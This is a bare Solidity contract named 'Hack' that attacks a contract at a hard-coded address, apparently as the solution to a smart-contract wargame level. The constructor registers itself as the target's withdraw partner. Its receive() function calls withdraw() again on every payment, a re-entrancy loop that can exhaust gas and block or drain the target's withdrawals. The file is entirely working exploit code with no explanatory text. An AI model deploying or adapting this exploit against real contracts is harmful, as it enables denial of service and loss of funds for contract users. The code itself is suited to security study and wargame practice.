// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITarget {
	function withdraw() external;
	function setWithdrawPartner(address _partner) external;
}

contract Hack {
	ITarget target = ITarget(address(0x7261f9a637d1e98B061eD32B2Bf2455AF222863d));

	constructor() {
		target.setWithdrawPartner(address(this));
	}

	receive() external payable {
		target.withdraw();
	}
}